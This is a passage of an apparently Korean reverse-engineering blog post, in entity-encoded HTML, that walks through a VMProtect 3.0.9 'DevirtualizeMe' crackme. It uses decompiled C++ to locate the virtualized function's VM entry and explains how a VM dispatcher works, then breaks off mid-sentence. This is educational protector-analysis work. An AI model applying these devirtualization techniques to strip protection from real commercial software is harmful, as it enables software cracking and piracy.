&#xB85C;&#xC9C1;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xBCF5;&#xC6D0;&#xD574; &#xBCF4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xB85C;&#xB294; IDA, Detect It Easy, Triton, VMPTrace &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.<br></p><h3 id="&#xBB38;&#xC81C;-&#xC815;&#xBCF4;"><a href="#&#xBB38;&#xC81C;-&#xC815;&#xBCF4;" class="headerlink" title="&#xBB38;&#xC81C; &#xC815;&#xBCF4;"></a>&#xBB38;&#xC81C; &#xC815;&#xBCF4;</h3><p><strong>Difficulty :</strong> 8<br><strong>Language :</strong> C++<br><strong>Platform :</strong> Windows x86<br><strong>OS Version :</strong> All<br><strong>Packer / Protector :</strong> VMProtect 3.0.9</p><p><strong>Unpack</strong> &#xBAA9;&#xD45C;</p><blockquote><p>&#xCCA8;&#xBD80;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;(<code>.exe</code>)&#xC5D0;&#xC11C; &#xAC00;&#xC0C1;&#xD654;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xACE0;,<br>&#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C; &#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xD55C; &#xD6C4; &#xD328;&#xCE58; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C; &#xC624;&#xB958;&#xAC00; &#xC5C6;&#xC774; &#xB3CC;&#xC544;&#xAC00;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p><strong><em>&#xC870;&#xAC74; :</em></strong><br>P&#xB97C; &#xB20C;&#xB800;&#xC744; &#xB54C; VMP &#xC601;&#xC5ED;&#xC5D0; &#xC788;&#xB294; &#xAC00;&#xC0C1;&#xD654; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xBA54;&#xC138;&#xC9C0; &#xBC15;&#xC2A4;&#xAC00; &#xB098;&#xD0C0;&#xB09C;&#xB2E4;.<br>&#xB09C;&#xB3C5;&#xD654; &#xD574;&#xC81C;&#xAC00; &#xC798; &#xB418;&#xC5C8;&#xB2E4;&#xBA74; (&#xD328;&#xCE58; &#xD6C4;&#xC5D0;&#xB3C4; &#xC6D0;&#xBCF8; &#xB85C;&#xC9C1;&#xC744; &#xC720;&#xC9C0;&#xD55C;&#xB2E4;&#xBA74;)<br>&#xD328;&#xCE58; &#xD6C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C; P&#xB97C; &#xB20C;&#xB7EC;&#xB3C4; crash&#xAC00; &#xB728;&#xC9C0; &#xC54A;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote></blockquote><p><img src="/2025/12/11/banda/VMPpart2/ko/image3.png" alt></p><p>DiE&#xC758; &#xC5D4;&#xD2B8;&#xB85C;&#xD53C;&#xB97C; &#xC5F4;&#xC5B4;&#xBCF4;&#xBA74; &#xC804;&#xD615;&#xC801;&#xC778; Virtualization &#xBAA8;&#xB4DC;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>.text</code> &#xC601;&#xC5ED;&#xC774; &#xB09C;&#xB3C5;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xACE0;, VMP&#xC758; &#xD575;&#xC2EC; VM bytecode&#xAC00; &#xB4E4;&#xC5B4;&#xAC14;&#xB2E4;&#xB294; &#xAC83;&#xC744; <code>.vmp0</code>&#xC774; &#xC124;&#xBA85;&#xD574;&#xC8FC;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. Entry Stub, Initialization stub&#xAC00; &#xD328;&#xD0B9;&#xB418;&#xC5C8;&#xACE0;, Run-time VM engine&#xC740; <code>.vmp0</code>&#xC5D0; &#xC874;&#xC7AC;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. <code>WinMain</code> &#x2192; <code>UnpackMe</code> &#x2192; <code>Run</code>&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xD750;&#xB984;&#xC744; &#xB530;&#xB77C;&#xAC00;&#xBA74;&#xC11C;, &#xC2E4;&#xC81C;&#xB85C; VMEntry&#xAC00; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xB294;&#xC9C0;&#xBD80;&#xD130; &#xCC28;&#xADFC;&#xCC28;&#xADFC; &#xD655;&#xC778;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Road-to-VMEntry"><a href="#Road-to-VMEntry" class="headerlink" title="Road to VMEntry"></a>Road to VMEntry</h3><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __stdcall <span class="hljs-title">WinMain</span><span class="hljs-params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="hljs-keyword">int</span> nShowCmd)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">void</span> (__stdcall ***v4)(HINSTANCE); <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">void</span> (__stdcall ***v5)(HINSTANCE); <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">void</span> (__stdcall **v6)(HINSTANCE); <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  SetUnhandledExceptionFilter(TopLevelExceptionFilter);  v4 = (<span class="hljs-keyword">void</span> (__stdcall ***)(HINSTANCE))<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>(<span class="hljs-number">0x48</span>u);  v5 = v4;  <span class="hljs-keyword">if</span> ( v4 )    *v4 = (<span class="hljs-keyword">void</span> (__stdcall **)(HINSTANCE))&amp;UnpackMe::`vftable<span class="hljs-number">&apos;</span>;  <span class="hljs-comment">// vtable &#xC124;&#xC815;</span>  <span class="hljs-keyword">else</span>    v5 = <span class="hljs-number">0</span>;  v6 = *v5;  UnpackMe* <span class="hljs-keyword">this</span> = v5;  (*v6)(hInstance);   <span class="hljs-comment">// vtable[0] &#xD638;&#xCD9C;</span>  j__free(UnpackMe* <span class="hljs-keyword">this</span>);  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xAC00;&#xC0C1;&#xD654; &#xB09C;&#xB3C5;&#xD654; VM&#xC740; &#xBCF4;&#xD1B5; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xAC00;&#xC9C4;&#xB2E4;&#xACE0; &#xC815;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>VM Entry</code> / <code>VM Exit</code><br>Entry : &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;, &#xC2A4;&#xD0DD; &#xC0C1;&#xD0DC;&#xB97C; VM &#xC0C1;&#xD0DC;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xAD6C;&#xAC04;<br>Exit : &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xB05D;&#xB09C; &#xB4A4;, &#xB2E4;&#xC2DC; &#xC6D0;&#xB798; &#xB808;&#xC9C0;&#xC2A4;&#xD130;, &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; &#xB3CC;&#xB824;&#xC8FC;&#xB294; &#xAD6C;&#xAC04;</li><li><code>VM Dispatcher</code><br>&#xAC00;&#xC0C1; PC(<code>VIP</code>)&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC5D0;&#xC11C; opcode&#xB97C; &#xC77D;&#xACE0; -&gt; &#xC5B4;&#xB5A4; &#xD578;&#xB4E4;&#xB7EC;&#xB85C; &#xAC08;&#xC9C0; &#xACB0;&#xC815;<br>-&gt; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB8E8;&#xD504;</li><li><code>Handler Table</code><br>Opcode &#xAC12;&#xB9C8;&#xB2E4; &#xC5F0;&#xACB0;&#xB41C; &#xD578;&#xB4E4;&#xB7EC; &#xD568;&#xC218;&#xB4E4;&#xC758; &#xD14C;&#xC774;&#xBE14;<br>&#xAC01; &#xD578;&#xB4E4;&#xB7EC;&#xB294; &#x201C;&#xAC00;&#xC0C1; <code>ADD</code>, &#xAC00;&#xC0C1; <code>XOR</code>, &#xAC00;&#xC0C1; &#xBD84;&#xAE30;&#x201D; &#xAC19;&#xC740; &#xD558;&#xB098;&#xC758; VM &#xBA85;&#xB839;&#xC5B4; &#xC758;&#xBBF8;&#xB97C; &#xAD6C;&#xD604;  <br><br></li></ul><p>DevirtualizeMe &#xAC19;&#xC740; &#xC2E4;&#xC804; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xCCAB; &#xB2E8;&#xACC4;&#xB294; &#x201C;VMEntry&#xAC00; &#xC5B4;&#xB514;&#xC778;&#xC9C0; &#xCC3E;&#xB294; &#xAC83;&#x201D;&#xC785;&#xB2C8;&#xB2E4;. VMEntry&#xB97C; &#xCC3E;&#xC544;&#xC57C; VM State&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC778;&#xB370;, VM State&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xD6C4;&#xC5D0; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><code>WinMain()</code> &#xD568;&#xC218;&#xB294; &#xAD6C;&#xC870;&#xAC00; &#xB2E8;&#xC21C;&#xD569;&#xB2C8;&#xB2E4;. deevirtualization &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, VMP&#xB294; &#xBCF4;&#xD1B5; &#x201C;&#xD2B9;&#xC815; &#xD568;&#xC218;&#x201D;&#xB9CC; &#xAC00;&#xC0C1;&#xD654;&#xD558;&#xACE0;, &#xADF8; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB294; C++ &#xCF54;&#xB4DC; &#xADF8;&#xB300;&#xB85C; &#xB461;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC5EC;&#xAE30;&#xC11C; <code>vtable[0]</code>&#xC774; <code>UnpackMe::Run</code>&#xC774;&#xB77C;&#xB294; &#xC0AC;&#xC2E4;&#xB9CC; &#xD655;&#xC778;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xBD05;&#xC2DC;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image4.png" alt></p><p>vtable&#xC744; &#xB530;&#xB77C;&#xAC00; &#xBCF4;&#xBA74; C++ &#xD074;&#xB798;&#xC2A4; <code>UnpackMe</code>&#xC758; vtable&#xC774; <code>.rdata</code> &#xC139;&#xC158;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IDA&#xC5D0;&#xC11C; RTTI&#xAC00; &#xBCF5;&#xC6D0;&#xB418;&#xBA74; <code>??_7UnpackMe@@6B@</code> &#xC2EC;&#xBCFC;&#xC774; &#xBD99;&#xACE0;, <code>vtable</code>&#xC758; &#xCCAB; &#xC5D4;&#xD2B8;&#xB9AC;&#xB294; &#xC790;&#xB3D9;&#xC73C;&#xB85C; <code>UnpackMe::Run</code> &#xC774;&#xB984;&#xC774; &#xB9E4;&#xD551;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xBA54;&#xC778; &#xB8E8;&#xD504;&#xB97C; &#xC5EC;&#xB294; <code>UnpackMe::Run</code>&#xC73C;&#xB85C; &#xB118;&#xC5B4;&#xAC00; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::Run</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *<span class="hljs-keyword">this</span>, HINSTANCE hInst)</span></span><span class="hljs-function"></span>{    *((DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">1</span>) = hInst;    WNDCLASSEXW wc = {<span class="hljs-number">0</span>};    wc.cbSize       = <span class="hljs-keyword">sizeof</span>(wc);    wc.style        = <span class="hljs-number">3</span>;    wc.lpfnWndProc  = (WNDPROC)sub_40CC70;    wc.hInstance    = hInst;    wc.lpszClassName = <span class="hljs-string">L&quot;WndClass_DevirtualizeMe&quot;</span>;    RegisterClassExW(&amp;wc);    ((<span class="hljs-keyword">void</span> (__thiscall*)(<span class="hljs-keyword">void</span>*))(*(DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">8</span>))(<span class="hljs-keyword">this</span>);    <span class="hljs-keyword">while</span> ( GetMessageW(&amp;Msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) )    {        TranslateMessage(&amp;Msg);        DispatchMessageW(&amp;Msg);   <span class="hljs-comment">// &#xC5EC;&#xAE30;&#xC11C; WndProc &#xCCB4;&#xC778;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC10;</span>    }}</code></pre><p>devirtualization &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740;, <code>Run</code> &#xD568;&#xC218;&#xAC00; VM&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xBB38;&#xC9C0;&#xAE30; &#xAC19;&#xC740; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD0A4;&#xBCF4;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; P&#xD0A4;&#xAC00; &#xC785;&#xB825;&#xB418;&#xBA74;, &#xC774; &#xB8E8;&#xD504;&#xB97C; &#xD0C0;&#xBA74;&#xC11C; VMProtect Entry&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;! &#xC774; &#xD568;&#xC218;&#xB294; &#xC708;&#xB3C4;&#xC6B0; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xACE0;, <code>lpfnWndProc = sub_40CC70</code>&#xB85C; &#xC804;&#xC5ED; <code>WndProc</code>&#xC744; &#xC124;&#xC815;&#xD55C; &#xB4A4;, &#xBA54;&#xC2DC;&#xC9C0; &#xB8E8;&#xD504;&#xC5D0;&#xC11C; <code>DispatchMessageW</code>&#xB97C; &#xBC18;&#xBCF5; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xD0A4; &#xC785;&#xB825;(P &#xD0A4; &#xD3EC;&#xD568;)&#xC740; &#xBAA8;&#xB450; &#xC774; &#xBA54;&#xC2DC;&#xC9C0; &#xB8E8;&#xD504;&#xB97C; &#xD1B5;&#xD574; <code>WndProc</code>&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0;, &#xADF8; &#xC548;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; <code>UnpackMe</code> &#xBA64;&#xBC84; &#xD568;&#xC218;&#xB4E4;&#xB85C; &#xB77C;&#xC6B0;&#xD305;&#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-function">LRESULT __stdcall <span class="hljs-title">WndProc</span><span class="hljs-params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( dword_415F08 )        <span class="hljs-comment">// vtable[1] = UnpackMe::WndProc(sub_40CB60)</span>        <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__thiscall*)(<span class="hljs-keyword">void</span>*, HWND, UINT, WPARAM, LPARAM))                (*(DWORD*)UnpackMe* <span class="hljs-keyword">this</span> + <span class="hljs-number">4</span>))(                    dword_415F08, hWnd, Msg, wParam, lParam);    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">return</span> DefWindowProcW(hWnd, Msg, wParam, lParam);}</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC0AC;&#xC2E4;&#xC740;, OS &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; <code>UnpackMe</code>&#xB77C;&#xB294; C++ &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC874;&#xC7AC;&#xB098; &#xAC1D;&#xCCB4; &#xAC1C;&#xC218;&#xB97C; &#xC804;&#xD600; &#xBAA8;&#xB985;&#xB2C8;&#xB2E4;. OS&#xB294; &#xB2E8;&#xC9C0; <code>WndClass_DevirtualizeMe</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0; &#xB300;&#xD55C; &#xC708;&#xB3C4;&#xC6B0;&#xC5D0; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xC624;&#xBA74; <code>sub_40CC70</code>&#xC744; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;&#xB294; &#xC815;&#xB3C4;&#xB9CC; &#xC54C;&#xACE0; &#xC788;&#xACE0;, <code>sub_40CC70</code>&#xC774; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>UnpackMe::WndProc</code>&#xC73C;&#xB85C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xB118;&#xAE30;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, devirtualization &#xAD00;&#xC810;&#xC5D0;&#xC11C;&#xB294; &#xACB0;&#xAD6D; &#xBAA8;&#xB4E0; &#xD0A4;&#xBCF4;&#xB4DC; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; <code>UnpackMe::WndProc</code>&#xB85C; &#xB4E4;&#xC5B4;&#xC628;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xAE30;&#xC5B5;&#xD569;&#xC2DC;&#xB2E4;! &#xC6B0;&#xB9AC;&#xB294; &#xC774; &#xBA64;&#xBC84; <code>WndProc()</code>&#xC5D0;&#xC11C; <code>WM_KEYDOWN</code>&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0;&#xB9CC; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.  </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::WndProc</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                 HWND hWnd,</span></span><span class="hljs-function"><span class="hljs-params">                                 UINT Msg,</span></span><span class="hljs-function"><span class="hljs-params">                                 WPARAM wParam,</span></span><span class="hljs-function"><span class="hljs-params">                                 LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( Msg &gt; <span class="hljs-number">0x14</span> )    {        <span class="hljs-keyword">if</span> ( Msg &lt;= <span class="hljs-number">0x111</span> )        {            <span class="hljs-keyword">switch</span> ( Msg )            {            <span class="hljs-keyword">case</span> <span class="hljs-number">0x100</span>:  <span class="hljs-comment">// WM_KEYDOWN</span>                <span class="hljs-comment">// vtable[6] = OnKeyDown</span>                <span class="hljs-keyword">return</span> ((<span class="hljs-keyword">int</span> (__thiscall*)(<span class="hljs-keyword">void</span>*, HWND, WPARAM, LPARAM))                        (*(DWORD*)<span class="hljs-keyword">this</span> + <span class="hljs-number">24</span>))(                            <span class="hljs-keyword">this</span>, hWnd, wParam, lParam);            <span class="hljs-keyword">case</span> <span class="hljs-number">0x111</span>:  <span class="hljs-comment">// WM_COMMAND</span>                ...            }        }    }    ...}</code></pre><p><code>WM_KEYDOWN</code>&#xC774; &#xB3C4;&#xCC29;&#xD558;&#xBA74;, &#xD568;&#xC218;&#xB294; <code>vtable[6]</code>&#xC5D0; &#xB9E4;&#xD551;&#xB41C; <code>OnKeyDown</code>&#xC73C;&#xB85C; &#xC81C;&#xC5B4;&#xB97C; &#xB118;&#xAE41;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xBA54;&#xC2DC;&#xC9C0; &#xB77C;&#xC6B0;&#xD305; &#xB2E8;&#xACC4;&#xC774;&#xBA70;, &#xC2E4;&#xC81C; VMProtect &#xAC00;&#xC0C1;&#xD654; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xC9C1; &#xB4F1;&#xC7A5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC2AC;&#xD37C;&#xD558;&#xC9C0; &#xB9C8;&#xC138;&#xC694;. &#xACE7; &#xB098;&#xC62C; &#xAC83; &#xAC19;&#xC740; &#xC608;&#xAC10;&#xC774; &#xB4ED;&#xB2C8;&#xB2E4;.  <br></p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __thiscall <span class="hljs-title">UnpackMe::OnKeyDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                   HWND hWnd,</span></span><span class="hljs-function"><span class="hljs-params">                                   WPARAM wParam,</span></span><span class="hljs-function"><span class="hljs-params">                                   LPARAM lParam)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> ( wParam == <span class="hljs-string">&apos;P&apos;</span> )        proc();    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>OnKeyDown</code>&#xC740; &#xD0A4;&#xBCF4;&#xB4DC; &#xC785;&#xB825;&#xC744; &#xC2E4;&#xC81C;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. <code>wParam</code>&#xC774; &#xBB38;&#xC790; <code>&apos;P&apos;(0x50)</code>&#xC77C; &#xB54C;&#xB9CC; <code>vir_Entry()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;, &#xADF8; &#xC678;&#xC758; &#xD0A4; &#xC785;&#xB825;&#xC740; &#xBAA8;&#xB450; &#xBB34;&#xC2DC;&#xD569;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image5.png" alt></p><p>&#xC2E4;&#xC81C;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD55C; &#xB4A4;&#xC5D0; P &#xD0A4;&#xB97C; &#xB204;&#xB974;&#xBA74; &#xC8FC;&#xC18C; &#xC815;&#xBCF4;&#xC640; &#xD568;&#xAED8; &#xBA54;&#xC138;&#xC9C0; &#xBC15;&#xC2A4;&#xAC00; &#xB728;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC9C4;&#xC785;&#xC810;&#xC774; <code>vir_Entry()</code>&#xB77C;&#xACE0; &#xBCF4;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image6.png" alt></p><p>&#xC5EC;&#xAE30;&#xBD80;&#xD130; <code>call analysis failed</code>&#xAC00; &#xB728;&#xBA74;&#xC11C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xB294;&#xB370;, &#xC774; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; &#xBE44;&#xC815;&#xC0C1; &#xC81C;&#xC5B4; &#xD750;&#xB984;, &#xAC04;&#xC811; &#xBD84;&#xAE30;, &#xC2A4;&#xD0DD;/&#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xB9DD;&#xAC00;&#xB728;&#xB9AC;&#xB294; &#xC2DC;&#xD000;&#xC2A4;&#xAC00; &#xC788;&#xC5B4;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC778; C&#xCF54;&#xB4DC;&#xB85C; &#xBCF5;&#xAD6C;&#xAC00; &#xC5B4;&#xB835;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, devirtualizer&#xC744; &#xB9CC;&#xB4E4;&#xAC70;&#xB098; &#xD574;&#xB3C5;&#xD560; &#xB54C;&#xC758; &#xCD9C;&#xBC1C;&#xC810;&#xC774; &#xBC14;&#xB85C; &#xC774; <code>vir_Entry()</code>&#xAC00; &#xB418;&#xACA0;&#xC8E0;?  </p><p>&#xC800;&#xD76C;&#xB294; VMProtect&#xAC00; &#xBCF4;&#xD638;&#xD55C; &#xD568;&#xC218;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xC804;&#xCCB4; &#xACBD;&#xB85C;&#xAC00;  </p><pre><code class="hljs c">WinMain &#x2192; UnpackMe::Run &#x2192; DispatchMessage &#x2192; UnpackMe::WndProc &#x2192; OnKeyDown &#x2192; proc()</code></pre><p>&#xC784;&#xC744; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; <code>proc()</code> &#xB610;&#xB294; &#xADF8; &#xC548;&#xC758; <code>vir_Entry</code> &#xC9C0;&#xC810;&#xC774; VMEntry + VMProtect Virtualized &#xD568;&#xC218; &#xBAB8;&#xD1B5;&#xC774;&#xB77C;&#xB294; &#xAC83;&#xAE4C;&#xC9C0; &#xD30C;&#xC545;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>VMEntry &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC558;&#xC73C;&#xB2C8; &#xB514;&#xBC84;&#xAC70;&#xB97C; &#xC5F0;&#xACB0;&#xD574; &#xC2E4;&#xD589;&#xC744; &#xB530;&#xB77C;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;. &#xC9C4;&#xC785; &#xC9C1;&#xD6C4;&#xC778; <code>0x004869BB</code>&#xBD80;&#xD130;&#xB294; VMProtect &#xD2B9;&#xC720;&#xC758; &#xAC00;&#xC0C1;&#xD654; &#xC5D4;&#xC9C4; &#xCF54;&#xB4DC;&#xAC00; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB098;&#xBA70;, <code>push</code>, <code>call</code>, <code>xor</code>, <code>add</code> &#xB4F1;&#xC758; &#xC5F0;&#xC0B0;&#xACFC; &#xD568;&#xAED8; <code>mov eax, [esi]</code> / <code>add esi, 4</code>&#xC640; &#xAC19;&#xC740; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC2A4;&#xD2B8;&#xB9BC; &#xB85C;&#xB529; &#xD328;&#xD134;&#xC774; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD750;&#xB984;&#xC740; VMProtect&#xAC00; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xC0C1; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xD3EC;&#xC778;&#xD130;(<code>ESI</code>)&#xB97C; &#xAC31;&#xC2E0;&#xD558;&#xBA74;&#xC11C; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC11D;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC744; &#xBA85;&#xD655;&#xD788; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image7.png" alt></p><p>&#xC804;&#xCCB4; VM &#xC5D4;&#xC9C4;&#xC744; &#xD558;&#xB098;&#xC758; CFG&#xB85C; &#xD1B5;&#xD569;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xC778;&#xAC04;&#xC774; &#xD558;&#xAE30;&#xC5D0;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xC5D0; &#xAC00;&#xAE5D;&#xC2B5;&#xB2C8;&#xB2E4;. VMProtect&#xB294; &#xC218;&#xCC9C; 